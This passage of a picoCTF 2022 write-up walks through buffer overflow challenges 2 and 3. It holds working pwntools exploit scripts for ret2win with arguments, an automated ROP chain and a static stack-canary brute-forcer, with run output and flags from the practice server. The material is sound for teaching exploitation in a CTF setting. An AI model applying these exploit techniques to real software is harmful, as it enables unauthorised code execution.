+<p>The next thing we need to know about is the way functions are laid out on the stack. Let’s recall the diagram I drew out earlier:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/stack-visual2.png" alt="Stack Diagram"></p>
+<p>If we want to call a function with parameters, we’ll need to include the base pointer alongside a return address, which can simply be <code>main()</code>. With this, we can basically copy our script over from <code>Buffer overflow 1</code> with a few tweaks to the payload:</p>
+<div><figure class="highlight py" style=""><table><figcaption><span>buffer-overflow-2.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/c6c17fc63ca801d0b64d8bb5acc982c1"><span>[github gist link]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="comment">#!/usr/bin/env python3</span>
+<span class="keyword">from</span> pwn <span class="keyword">import</span> *
+
+elf = context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span>, checksec=<span class="literal">False</span>)    <span class="comment"># sets elf object</span>
+host, port = <span class="string">&#x27;saturn.picoctf.net&#x27;</span>, [PORT]
+
+p = process(elf.path)        <span class="comment"># creates local process w/ elf object</span>
+p.sendline(cyclic(<span class="number">128</span>))      <span class="comment"># sends cyclic pattern to crash</span>
+p.wait()                     <span class="comment"># sigsegv generates core dump</span>
+core = Coredump(<span class="string">&#x27;./core&#x27;</span>)    <span class="comment"># parses core dump file</span>
+
+payload = flat([
+    {cyclic_find(core.eip): elf.symbols.win},    <span class="comment"># pads win address</span>
+    elf.symbols.main,                            <span class="comment"># return address</span>
+    <span class="number">0xCAFEF00D</span>,                                  <span class="comment"># parameter 1</span>
+    <span class="number">0xF00DF00D</span>                                   <span class="comment"># parameter 2</span>
+])
+
+<span class="keyword">if</span> args.REMOTE:
+    p = remote(host, port)
+<span class="keyword">else</span>:
+    p = process(elf.path)
+
+p.sendline(payload)
+p.interactive()</pre></td></tr></table></div>
+
+<p>Let’s run it on the remote server:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 buffer-overflow-2.py REMOTE
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 3988
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
+-11 (SIGSEGV) (pid 3988)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffca3290
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+\xf0\xfe\xcadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua-<br>aaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04r\x93\x04
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}</pre></td></tr></table></div>
+
+<h3 id="II-The-Easy-Way-🐇"><a href="#II-The-Easy-Way-🐇" class="headerlink" title="II: The Easy Way 🐇"></a>II: The Easy Way 🐇</h3><p>But… what if you wanted to be an even <strong>more</strong> lazy pwner? Well, you’re in luck, because I present to you: the <strong><a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/rop/rop.html">pwntools ROP object</a></strong>! By throwing our elf object into <code>ROP()</code> it transforms, and we can use it to automatically call functions and build chains! Here it is in action:</p>
+<figure class="highlight py"><figcaption><span>buffer-overflow-2-automated.py</span><a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/a5bfe03bdf5b2d766ef5fa402e9e35d6">[github gist link]</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./vuln&#x27;</span> checksec=<span class="literal">False</span>)    <span class="comment"># sets elf object</span></span><br><span class="line">rop = ROP(elf)                                         <span class="comment"># creates ROP object</span></span><br><span class="line">host, port = <span class="string">&#x27;saturn.picoctf.net&#x27;</span>, [PORT]</span><br><span class="line"></span><br><span class="line">p = process(elf.path)        <span class="comment"># creates local process w/ elf object</span></span><br><span class="line">p.sendline(cyclic(<span class="number">128</span>))      <span class="comment"># sends cyclic pattern to crash</span></span><br><span class="line">p.wait()                     <span class="comment"># sigsegv generates core dump</span></span><br><span class="line">core = Coredump(<span class="string">&#x27;./core&#x27;</span>)    <span class="comment"># parses core dump file</span></span><br><span class="line"></span><br><span class="line">rop.win(<span class="number">0xCAFEF00D</span>, <span class="number">0xF00DF00D</span>)                        <span class="comment"># Call win() with args</span></span><br><span class="line">payload = fit(&#123;cyclic_find(core.eip): rop.chain()&#125;)    <span class="comment"># pad ROP chain</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args.REMOTE:</span><br><span class="line">    p = remote(host, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(elf.path)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>Let’s run it on the remote server:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 buffer-overflow-2-automated.py REMOTE
+[<span style="color:#277FFF"><b>*</b></span>] Loaded 10 cached gadgets for &apos;./vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos;: pid 4993
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; stopped with exit code
+-11 (SIGSEGV) (pid 4993)
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-2/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x62616164
+    ESP:       0xffd07fc0
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-2/vuln&apos; (0x8048000)
+    Fault:     0x62616164
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port <span style="color:#696969"><b>[PORT]</b></span>: Done
+[<span style="color:#277FFF"><b>*</b></span>] Switching to interactive mode
+Please enter your string: 
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaa-
+avaaawaaaxaaayaaazaabbaabcaab\x96\x\xf0\xfe\xca
+picoCTF{argum3nt5_4_d4yZ_<span style="color:#696969"><b>[REDACTED]</b></span>}<span style="color:#EC0101"><b>$</b></span> [<span style="color:#277FFF"><b>*</b></span>] Got EOF while reading in interactive</pre></td></tr></table></div>
+
+<p>We’ve successfully called a function with arguments through buffer overflow!</p>
+<hr>
+<div class="challenge">
+    <div class="challenge-title"><h2 id="Buffer-overflow-3" class="chal-title"><a href="#Buffer-overflow-3" class="headerlink" title="Buffer overflow 3"></a>Buffer overflow 3</h2></div>
+    <div style="display:flex;" class="no-highlight">
+        <div class="challenge-info">
+            <div class="center-align">
+                <i class="fa-solid fa-user fa-fw"></i> <b>solver</b>: <img style="display: inline-block; border-radius: 50%; width: 20px; margin-bottom: -6px;" src="https://avatars.githubusercontent.com/u/71956291"> <a target="_blank" rel="noopener" href="https://github.com/jktrn">enscribe</a><br>
+                <i class="fa-solid fa-square-pen fa-fw"></i> <b>authors</b>: <br> - Sanjay C.<br> - Palash Oswal<br>
+                <i class="fa-solid fa-tag fa-fw"></i> <b>genre</b>: pwn/binary<br>
+                <i class="fa-solid fa-circle-plus fa-fw"></i> <b>points</b>: 300<br>
+                
+                <i class="fa-solid fa-file fa-fw"></i> <b>files</b>: <a href="/static/picoctf-2022/buffer-overflow/vuln-3">vuln</a>, <a href="/static/picoctf-2022/buffer-overflow/vuln-3.c">vuln.c</a><br>
+            </div>
+        </div>
+        <div class="challenge-description">
+            <div class="center-align" style="font-size: 110%">
+                Do you think you can bypass the protection and get the flag?  It looks like Dr. Oswal added a stack canary to this <a href="/static/picoctf-2022/buffer-overflow/vuln-3">program</a> to protect against buffer overflows. You can view source <a href="/static/picoctf-2022/buffer-overflow/vuln-3.c">here</a>. And connect with it using:<br />
+<code>nc saturn.picoctf.net [PORT]</code>
+                <br><details><summary><b>Hints</b>:</summary><br><ol>
+<li>Maybe there's a smart way to brute-force the canary?</li>
+</ol><br></details>
+            </div>
+        </div>
+    </div>
+    </div>
+
+<div class="text-warning no-highlight"><i class="fa-solid fa-triangle-exclamation"></i> Warning: This is an <strong>instance-based</strong> challenge. Port info will be redacted alongside the last eight characters of the flag, as they are dynamic.</div>
+
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><figcaption><span>checksec.sh</span><a target="_blank" rel="noopener" href="https://github.com/slimm609/checksec.sh"><span>[github link]</span></a></figcaption><tr><td class="code"><pre><span class="meta prompt_">$ </span>checksec vuln
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
+    Arch:     i386-32-little
+    RELRO:    <span style="color:#FEA44C">Partial RELRO</span>
+    Stack:    <span style="color:#D41919">No canary found</span>
+    NX:       <span style="color:#5EBDAB">NX enabled</span>
+    PIE:      <span style="color:#D41919">No PIE (0x8048000)</span></pre></td></tr></table></div>
+
+<h3 id="I-Finding-the-Canary-🐦"><a href="#I-Finding-the-Canary-🐦" class="headerlink" title="I: Finding the Canary 🐦"></a>I: Finding the Canary 🐦</h3><p>So, Dr. Oswal apparently implemented a <a target="_blank" rel="noopener" href="https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/">stack canary</a>, which is just a <strong>dynamic value</strong> appended to binaries during compilation. It helps detect and mitigate stack smashing attacks, and programs can terminate if they detect the canary being overwritten. Yet, <code>checksec</code> didn’t find a canary. That’s a bit suspicious… but let’s check out our source code first:</p>
+<div><figure class="highlight c" style="height: 400px; overflow: scroll; margin: 1rem 0;"><table><figcaption><span>vuln-3.c</span><a href="https://enscribe.dev/static/picoctf-2022/buffer-overflow/vuln-3.c"><span>[download source]</span></a></figcaption><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wchar.h&gt;</span></span>
+<span class="meta">#<span class="keyword">include</span> <span class="string">&lt;locale.h&gt;</span></span>
+
+<span class="meta">#<span class="keyword">define</span> BUFSIZE 64</span>
+<span class="meta">#<span class="keyword">define</span> FLAGSIZE 64</span>
+<span class="meta">#<span class="keyword">define</span> CANARY_SIZE 4</span>
+
+<span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> {
+  <span class="type">char</span> buf[FLAGSIZE];
+  FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
+  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,
+                    <span class="string">&quot;own debugging flag.\n&quot;</span>);
+    fflush(<span class="built_in">stdout</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+
+  fgets(buf,FLAGSIZE,f); <span class="comment">// size bound read</span>
+  <span class="built_in">puts</span>(buf);
+  fflush(<span class="built_in">stdout</span>);
+}
+
+<span class="type">char</span> global_canary[CANARY_SIZE];
+<span class="type">void</span> <span class="title function_">read_canary</span><span class="params">()</span> {
+  FILE *f = fopen(<span class="string">&quot;canary.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);
+  <span class="keyword">if</span> (f == <span class="literal">NULL</span>) {
+    <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;canary.txt&#x27; in this directory with your&quot;</span>,
+                    <span class="string">&quot;own debugging canary.\n&quot;</span>);
+    fflush(<span class="built_in">stdout</span>);
+    <span class="built_in">exit</span>(<span class="number">0</span>);
+  }
+
+  fread(global_canary,<span class="keyword">sizeof</span>(<span class="type">char</span>),CANARY_SIZE,f);
+  fclose(f);
+}
+
+<span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span>{
+   <span class="type">char</span> canary[CANARY_SIZE];
+   <span class="type">char</span> buf[BUFSIZE];
+   <span class="type">char</span> length[BUFSIZE];
+   <span class="type">int</span> count;
+   <span class="type">int</span> x = <span class="number">0</span>;
+   <span class="built_in">memcpy</span>(canary,global_canary,CANARY_SIZE);
+   <span class="built_in">printf</span>(<span class="string">&quot;How Many Bytes will You Write Into the Buffer?\n&gt; &quot;</span>);
+   <span class="keyword">while</span> (x&lt;BUFSIZE) {
+      read(<span class="number">0</span>,length+x,<span class="number">1</span>);
+      <span class="keyword">if</span> (length[x]==<span class="string">&#x27;\n&#x27;</span>) <span class="keyword">break</span>;
+      x++;
+   }
+   <span class="built_in">sscanf</span>(length,<span class="string">&quot;%d&quot;</span>,&amp;count);
+
+   <span class="built_in">printf</span>(<span class="string">&quot;Input&gt; &quot;</span>);
+   read(<span class="number">0</span>,buf,count);
+
+   <span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) {
+      <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>);
+      fflush(<span class="built_in">stdout</span>);
+      <span class="built_in">exit</span>(<span class="number">-1</span>);
+   }
+   <span class="built_in">printf</span>(<span class="string">&quot;Ok... Now Where&#x27;s the Flag?\n&quot;</span>);
+   fflush(<span class="built_in">stdout</span>);
+}
+
+<span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>{
+
+  setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);
+  
+  <span class="comment">// Set the gid to the effective gid</span>
+  <span class="comment">// this prevents /bin/sh from dropping the privileges</span>
+  <span class="type">gid_t</span> gid = getegid();
+  setresgid(gid, gid, gid);
+  read_canary();
+  vuln();
+  <span class="keyword">return</span> <span class="number">0</span>;
+}</pre></td></tr></table></div>
+
+<p>If you look closely, you might be able to see why <code>checksec</code> didn’t find a stack canary. That’s because it’s actually a static variable, being read from a <code>canary.txt</code> on the host machine. Canaries that aren’t implemented by the compiler are not really canaries!</p>
+<p>Knowing that the canary will be four bytes long (defined by <code>CANARY_SIZE</code>) and immediately after the 64-byte buffer (defined by <code>BUFSIZE</code>), we can write a brute forcing script that can determine the correct canary with a simple trick: <strong>by not fully overwriting the canary the entire time!</strong> Check out this segment of source code:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">memcmp</span>(canary,global_canary,CANARY_SIZE)) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;***** Stack Smashing Detected ***** : Canary Value Corrupt!\n&quot;</span>);</span><br><span class="line">   fflush(<span class="built_in">stdout</span>);</span><br><span class="line">   <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This uses <code>memcmp()</code> to determine if the current canary is the same as the global canary. If it’s different, then the program will run <code>exit(-1)</code>, which is a really weird&#x2F;invalid exit code and supposedly represents “<a target="_blank" rel="noopener" href="https://softwareengineering.stackexchange.com/questions/314563/where-did-exit-1-come-from">abnormal termination</a>“:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/memcmp1.svg" alt="memcmp1"></p>
+<p>However, if we theoretically overwrite the canary with a single correct byte, <code>memcmp()</code> won’t detect anything!:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/memcmp2.svg" alt="memcmp2"></p>
+<h3 id="II-Bypassing-the-Canary-💨"><a href="#II-Bypassing-the-Canary-💨" class="headerlink" title="II: Bypassing the Canary 💨"></a>II: Bypassing the Canary 💨</h3><p>We can now start writing our script! My plan is to loop through all printable characters for each canary byte, which can be imported from <code>string</code>. Let’s include that in our pwn boilerplate alongside a simple function that allows us to swap between a local and remote instance:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> printable</span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./vuln&quot;</span>, checksec=<span class="literal">False</span>) <span class="comment"># Creates ELF object</span></span><br><span class="line">host, port = <span class="string">&quot;saturn.picoctf.net&quot;</span>, [PORT]</span><br><span class="line">offset = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_process</span>(): <span class="comment"># Specify remote or local instance with CLI argument</span></span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br></pre></td></tr></table></figure>
+
+<p>Here’s the big part: the <code>get_canary()</code> function. I’ll be using <a target="_blank" rel="noopener" href="https://docs.pwntools.com/en/stable/log.html"><code>pwnlib.log</code></a> for some spicy status messages. My general process for the brute force is visualized here if you’re having trouble:</p>
+<p><img src="/static/picoctf-2022/buffer-overflow/brute-visual.svg" alt="Brute Force Visual"></p>
+<p>I’ll be initially sending 64 + 1 bytes, and slowly appending the correct canary to the end of my payload until the loop has completed four times:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_canary</span>():</span><br><span class="line">    canary = <span class="string">b&quot;&quot;</span></span><br><span class="line">    logger = log.progress(<span class="string">&quot;Finding canary...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> printable:</span><br><span class="line">            <span class="keyword">with</span> context.quiet: <span class="comment"># Hides any other log</span></span><br><span class="line">                p = new_process()</span><br><span class="line">                p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(offset + i).encode())</span><br><span class="line">                p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, flat([&#123;offset: canary&#125;, char.encode()]))</span><br><span class="line">                output = p.recvall()</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;?&quot;</span> <span class="keyword">in</span> output: <span class="comment"># If program doesn&#x27;t crash</span></span><br><span class="line">                    canary += char.encode()</span><br><span class="line">                    logger.status(<span class="string">f&#x27;&quot;<span class="subst">&#123;canary.decode()&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">    logger.success(<span class="string">f&#x27;&quot;<span class="subst">&#123;canary.decode()&#125;</span>&quot;&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> canary</span><br></pre></td></tr></table></figure>
+
+<p>The final thing we need to figure out is the offset between the canary to <code>$eip</code>, the pointer register, which we will repopulate with the address of <code>win()</code>. We can do this by appending a cyclic pattern to the end of our current payload (64 + 4 canary bytes) and reading the Corefile’s crash location, which will be the <code>$eip</code>:</p>
+<p>(Note: My canary is “abcd” because I put that in my <code>canary.txt</code>. It will be different on the remote!)</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 -q
+<span class="meta prompt_">>>></span> from pwn import *
+<span class="meta prompt_">>>></span> p = process('./vuln')
+[<span style="color:#9755B3">x</span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;
+[<span style="color:#47D4B9"><b>+</b></span>] Starting local process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos;: pid 1493
+<span class="meta prompt_">>>></span> payload = cyclic(64) + b&apos;abcd&apos; + cyclic(128)
+<span class="meta prompt_">>>></span> p.sendline(b&apos;196&apos;)
+<span class="meta prompt_">>>></span> p.sendline(payload)
+<span class="meta prompt_">>>></span> p.wait()
+[<span style="color:#277FFF"><b>*</b></span>] Process &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; stopped with exit code -11 (SIGSEGV) (pid 1493)
+<span class="meta prompt_">>>></span> core = Corefile(&apos;./core&apos;)
+[<span style="color:#9755B3">x</span>] Parsing corefile...
+[<span style="color:#277FFF"><b>*</b></span>] &apos;/home/kali/ctfs/pico22/buffer-overflow-3/core&apos;
+    Arch:      i386-32-little
+    EIP:       0x61616165
+    ESP:       0xffa06160
+    Exe:       &apos;/home/kali/ctfs/pico22/buffer-overflow-3/vuln&apos; (0x8048000)
+    Fault:     0x61616165
+[<span style="color:#47D4B9"><b>+</b></span>] Parsing corefile...: Done
+<span class="meta prompt_">>>></span> cyclic_find(0x61616165)
+16</pre></td></tr></table></div>
+
+<p>The offset is 16, so we’ll have to append that amount of bytes to the payload followed by the address of <code>win()</code>. I’ll combine all sections of our payload together with <code>flat()</code>, and then hopefully read the flag from the output:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">canary = get_canary()</span><br><span class="line">p = new_process()</span><br><span class="line">payload = flat([&#123;offset: canary&#125;, &#123;<span class="number">16</span>: elf.symbols.win&#125;])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="built_in">str</span>(<span class="built_in">len</span>(payload)).encode())</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, payload)</span><br><span class="line">log.success(p.recvall().decode(<span class="string">&quot;ISO-8859-1&quot;</span>)) <span class="comment"># recvallS() didn&#x27;t work :(</span></span><br></pre></td></tr></table></figure>
+
+<p>Since I segmented my script into parts, I decided against putting a giant codeblock here with the same code as earlier. Instead, I just put it on a <a target="_blank" rel="noopener" href="https://gist.github.com/jktrn/bafbc08bbee179588207e3e3caffde75">Gist</a>! Anyways, here’s the full script in action:</p>
+<div><figure class="highlight text" style="background-color: #1D1D1D;"><table><tr><td class="code"><pre style="white-space: pre-wrap; word-break: break-word;"><span class="meta prompt_">$ </span>python3 buffer-overflow-3.py
+[<span style="color:#47D4B9"><b>+</b></span>] Finding canary: 'BiRd'
+[<span style="color:#47D4B9"><b>+</b></span>] Opening connection to saturn.picoctf.net on port 57427: Done
+[<span style="color:#47D4B9"><b>+</b></span>] Receiving all data: Done (162B)
+[<span style="color:#277FFF"><b>*</b></span>] Closed connection to saturn.picoctf.net port 57427
+[<span style="color:#47D4B9"><b>+</b></span>] aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaBiRdraaasaaataa-
+auaaa6^H
+    Ok... Now Where&apos;s the Flag?
+    picoCTF{Stat1C_c4n4r13s_4R3_b4D_<span style="color:#696969"><b>[REDACTED]</b></span>}</pre></td></tr></table></div>
+
+<p>We’ve successfully performed a brute force on a vulnerable static canary!</p>
+<img src="https://s01.flagcounter.com/count2/8Xkk/bg_161616/txt_C9CACC/border_E9D3B6/columns_3/maxflags_12/viewers_3/labels_0/pageviews_1/flags_1/percent_0/">
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">home</a></li>
+         
+          <li><a href="/articles/">posts</a></li>
+         
+          <li><a href="/ctfs/">ctfs</a></li>
+         
+          <li><a href="/profiles/">profiles</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intro"><span class="toc-number">1.</span> <span class="toc-text">Intro</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-0"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Buffer-overflow-1"><span class="toc-number"></span> <span class="toc-text">Buffer overflow 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-Explaining-the-Stack-%F0%9F%92%AC"><span class="toc-number">1.</span> <span class="toc-text">I: Explaining the Stack 💬</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-Smashing-the-Stack-%F0%9F%94%A8"><span class="toc-number">2.</span> <span class="toc-text">II: Smashing the Stack 🔨</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#III-Finessing-the-Stack-%F0%9F%9B%A0%EF%B8%8F"><span class="toc-number">3.</span> <span class="toc-text">III: Finessing the Stack 🛠️</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IV-Automating-the-Stack-%F0%9F%94%A7"><span class="toc-number">4.</span> <span class="toc-text">IV: Automating the Stack 🔧</span></a></li></ol></li><li class="toc-item 